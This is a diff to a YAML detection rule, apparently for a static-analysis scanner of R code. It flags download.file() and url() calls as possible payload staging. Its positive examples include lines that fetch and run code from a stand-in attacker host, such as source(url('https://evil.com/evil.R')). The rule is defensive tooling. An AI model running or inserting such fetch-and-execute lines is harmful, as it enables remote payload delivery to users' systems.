@@ -1,16 +1,16 @@
 name: download_file_pattern
-version: "0.1.0"
+version: "0.2.0"
 type: warning
 attck:
   - T1105
   - T1195.002
 message: >-
-  download.file() fetches a remote file. This is commonly used to stage a
-  payload for execution via source() or system() and can enable two-stage
-  attacks where the downloaded payload is executed.
+  download.file() and url() retrieve or open a connection to a remote resource.
+  This can stage a payload for execution via source() or system() in a two-stage
+  attack.
 xpath: >-
   //SYMBOL_FUNCTION_CALL[
-    text() = 'download.file'
+    (text() = 'download.file' or text() = 'url')
     and not(preceding-sibling::OP-DOLLAR)
     and not(preceding-sibling::OP-AT)
   ]
@@ -21,8 +21,16 @@ positive_examples:
     utils::download.file("https://evil.com/evil.R", tempfile())
   - |
     download.file("https://evil.com/evil.so", "/tmp/payload.so", quiet = TRUE)
+  - |
+    con <- url("https://evil.com/evil.R")
+  - |
+    source(url("https://evil.com/evil.R"))
 negative_examples:
   - |
     foo$download.file("https://example.com/x")
   - |
     foo@download.file("https://example.com/x")
+  - |
+    foo$url("https://example.com/x")
+  - |
+    foo@url("https://example.com/x")
